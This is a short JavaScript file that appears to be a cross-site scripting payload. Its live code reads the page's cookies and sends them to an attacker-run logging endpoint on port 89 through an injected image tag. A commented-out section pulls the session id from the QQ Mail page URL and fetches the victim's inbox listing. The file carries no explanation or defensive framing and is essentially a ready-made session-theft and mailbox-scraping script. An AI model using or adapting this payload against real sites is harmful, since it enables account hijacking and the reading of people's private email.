/**
 * Created by lenovo on 2017/9/1.
 */
console.log(document.cookie);
var img = document.createElement("img");
img.src="http://localhost:89/log?a="+document.cookie;
document.body.appendChild(img);


////抓取qq邮箱列表
//if(top.window.location.href.indexOf("sid=")>0){
//    var sid = top.window.location.href.substr(top.window.location.href.indexOf("sid=")+4,24);
//}
//
//var folder_url = "https://"+top.window.location.host+"/cgi-bin/mail_list?folderid=1&page=0" +
//    "&s=inbox&sid="+sid;
//
//var ajax = null;
//if(window.XMLHttpRequest){
//    ajax = new XMLHttpRequest();
//}else if(window.ActiveXObject){
//    ajax = new ActiveXObject("Microsoft.XMLHTTP");
//}else{
//    //return;
//}
//
//ajax.open("GET",folder_url,true);
//ajax.send(null);
//
//ajax.onreadystatechange = function(){
//    if(ajax.readyState == 4 && ajax.status == 200){
//        console.log(ajax.responseText);
//    }
//}